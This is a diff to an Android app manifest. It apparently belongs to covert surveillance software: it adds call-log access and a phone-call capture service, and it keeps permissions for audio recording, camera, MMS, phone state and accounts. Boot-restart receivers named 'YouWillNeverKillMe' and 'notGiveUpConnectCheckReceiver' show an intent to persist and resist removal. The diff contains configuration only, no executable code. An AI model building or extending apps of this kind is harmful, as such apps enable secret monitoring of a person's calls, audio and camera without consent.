@@ -7,7 +7,8 @@
     <uses-permission android:name="android.permission.RECEIVE_MMS" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <!--<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />-->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.STORAGE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
@@ -18,7 +19,7 @@
     <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.CAMERA" />
 
     <!-- To auto-complete the email text field in the login form with the user's emails -->
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
@@ -65,8 +66,8 @@
         <receiver android:name=".postal.service.RestartServiceReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <!--<action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />-->
                 <action android:name="YouWillNeverKillMe" />
             </intent-filter>
         </receiver>
@@ -94,17 +95,22 @@
                 <action android:name="notGiveUpConnectCheckReceiver" />
             </intent-filter>
         </receiver>
+
+        <activity android:name=".postal.deleteApp.DeleteAPPActivity" />
+
+        <service
+            android:name=".postal.catchPhone.Call.PhoneCallService"
+            android:enabled="true"
+            android:exported="true" />
+
         <receiver
-            android:name=".postal.catchPhone.Call.CallStateReceiver"
+            android:name=".postal.catchPhone.Call.StartPhoneCallReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
-
-        <activity android:name=".postal.deleteApp.DeleteAPPActivity"></activity>
     </application>
 
 </manifest>
